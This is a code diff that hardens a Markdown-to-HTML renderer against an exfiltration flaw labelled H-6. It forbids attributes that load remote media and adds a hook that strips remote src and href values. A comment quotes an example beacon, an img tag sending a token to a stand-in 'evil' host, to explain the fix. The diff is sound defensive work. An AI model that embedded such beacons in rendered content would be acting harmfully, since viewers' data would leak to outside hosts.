@@ -16,11 +16,39 @@ const md = new MarkdownIt({
   breaks: false,
 });
 
+// Regression: H-6 markdown remote-subresource exfiltration.
+// Markdown renders in the TRUSTED app origin (NOT the sandbox iframe), so any attribute that
+// loads a remote subresource turns a published doc into a beacon the moment it's viewed (e.g.
+// `<img src="https://evil/?t=…">`, `srcset`, `<video poster>`, `style="background:url(http…)"`).
+// DOMPurify's default html profile strips scripts/handlers/javascript: but KEEPS those remote
+// loads — they break the "data never leaves the box" guarantee by content. We:
+//   1. FORBID_ATTR: srcset/poster/style — attributes that exist only to load remote media and
+//      have no legit inline use in our markdown render (style also blocks url() CSS beacons).
+//   2. an uponSanitizeAttribute hook that drops src/href whose value resolves to a remote
+//      http(s) origin, while KEEPING data: URIs and same-origin relative paths (legit images).
+// The hook is registered ONCE at module load (isomorphic-dompurify hooks are global + would
+// otherwise stack per-call).
+const URL_ATTRS = new Set(["src", "href"]);
+DOMPurify.addHook("uponSanitizeAttribute", (_node, data) => {
+  if (!URL_ATTRS.has(data.attrName)) return;
+  const value = (data.attrValue ?? "").trim();
+  if (value === "") return;
+  // Block anything that targets an explicit remote http(s)/protocol-relative origin. Relative
+  // paths ("/x", "x", "#frag") and data: URIs carry no scheme/authority → kept.
+  if (/^(https?:)?\/\//i.test(value)) {
+    data.keepAttr = false;
+  }
+});
+
 /** Render Markdown to sanitized HTML safe to embed in the trusted app origin. */
 export function renderMarkdown(source: string): string {
   if (!source || source.trim().length === 0) return "";
   const rendered = md.render(source);
-  return DOMPurify.sanitize(rendered, { USE_PROFILES: { html: true } }).trim();
+  return DOMPurify.sanitize(rendered, {
+    USE_PROFILES: { html: true },
+    // H-6: forbid attributes whose only purpose is loading remote media (no legit inline use here).
+    FORBID_ATTR: ["srcset", "poster", "style"],
+  }).trim();
 }
 
 /**
